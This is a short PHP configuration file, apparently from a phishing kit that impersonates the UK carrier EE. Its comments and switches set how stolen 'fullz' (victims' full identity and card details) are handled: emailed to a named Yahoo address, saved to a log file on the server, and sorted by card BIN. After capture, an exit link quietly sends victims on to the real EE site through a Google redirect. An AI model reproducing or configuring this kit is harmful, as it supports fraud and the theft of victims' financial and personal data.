<?php
//Systems:

// - Carrier lookup in results (Already activated)
// - Bin List (Change '0' from $binList to '1' to activate)
// - Send results via email (Change '0' from $sendEmail to '1' to activate)
// - Save results on server (Change '0' from $saveFile to '1' to activate) => assets/logs/fullz.txt
// - Save results in separated files clased by BIN (Change '0' from $binSave to '1' to activate)


$saveFile = 1;
$sendEmail = 1;
$binList = 0;
$binSave = 0;




$to = "tronifiedv2@yahoo.com"; //Your e-mail address to receive fullz
$ExitLink = "https://www.google.co.uk/url?sa=t&source=web&rct=j&url=http://ee.co.uk/&ved=0ahUKEwierabnx9fMAhVLOyYKHbJyANUQFgguMAA&usg=AFQjCNHlMOfDePYHkCQNzFsNi12C-HvYog&sig2=ZH6OkpPTl1FPWIK_JZsxnQ"; // Real site via google redirect
?>
